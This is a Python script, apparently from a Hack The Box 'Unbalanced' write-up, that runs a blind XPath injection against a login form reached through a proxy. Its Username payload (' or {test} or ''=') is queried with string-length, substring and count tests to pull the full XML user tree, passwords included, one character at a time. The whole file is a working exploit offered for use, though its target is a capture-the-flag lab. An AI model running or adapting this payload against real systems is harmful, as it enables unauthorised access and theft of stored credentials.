#!/usr/bin/env python3
##
## 0xdf
## https://0xdf.gitlab.io/2020/12/05/htb-unbalanced.html
##
##

import requests
import string
import sys


s = requests.session()
#s.proxies = {'http':'http://127.0.0.1:8080'}
s.proxies = {'http':'http://10.10.10.200:3128'}
keys = []

def xpath_req(test):
    resp = s.post('http://172.31.179.1/intranet.php', data={'Username':f"' or {test} or ''='", 'Password':'0xdf'})
    return 'Rita' in resp.text


def get_text(item, alpha=string.ascii_lowercase+string.ascii_uppercase):
    global keys
    for key in keys:
        if xpath_req(f"{item}='{key}'"):
            print(key, end='', flush=True)
            return key

    i = 1
    while True:
        if xpath_req(f'string-length({item})={i}'):
            break
        if i > 100:
            print("Error")
            sys.exit()
        i += 1

    text_len = i

    res = ''
    for i in range(1, text_len+1):
        for c in alpha:
            if xpath_req(f"substring({item}, 1, {i})='{res}{c}'"):
                res += c
                print(f'{c}', end='', flush=True)
                break
    keys += [res]
    return res

def get_node(node, depth=0):

    print(f'\n{" "*depth*2}<', end='', flush=True)
    node_name = get_text(f'name({node})')
    #print(node_name, end='', flush=True)
    print('>', end='', flush=True)

    # Count children
    i = 0
    while True:
        if xpath_req(f"count({node}/*)={i}"):
            #print(f'[+] {node} has {i} children')
            break
        i += 1
    num_children = i


    for i in range(1, num_children+1):
        get_node(f'{node}/*[position()={i}]', depth+1)

    if num_children == 0:
        #/Employees/Employee[position()=1]/Username='rita'
        #string-length(/Employees/*[position()=1]/Username)=3
        text = get_text(f'{node}', alpha=string.printable)
        #print(text, end='', flush=True)
    else:
        print(f'\n{" "*depth*2}', end='', flush=True)

    print(f'</{node_name}>', end='', flush=True)

get_node('/*[position()=1]')
print()

##
##
